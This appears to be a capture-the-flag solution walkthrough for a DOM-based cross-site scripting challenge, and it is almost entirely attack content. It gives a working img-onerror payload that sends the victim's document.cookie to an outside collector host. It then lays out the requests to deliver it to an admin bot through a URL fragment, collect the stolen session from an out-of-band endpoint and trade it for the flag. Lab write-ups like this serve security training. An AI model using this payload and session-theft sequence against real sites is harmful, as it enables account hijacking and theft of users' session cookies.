Full payload (put in the fragment, URL-encoded):

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

Submit it:

```
POST /report
Content-Type: application/json

{"url":"/#%3Cimg%20src%3Dx%20onerror%3D...%3E"}
```

(URL-encode the whole payload after `/#`.) Wait ~2s for the admin bot, then:

```
GET /oob/received
```

Find the item with a path like `/report?c=session%3D<32 hex>`. That 32-hex value
is the admin session. Submit it:

```
POST /solve   {"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` does all of this end to end.
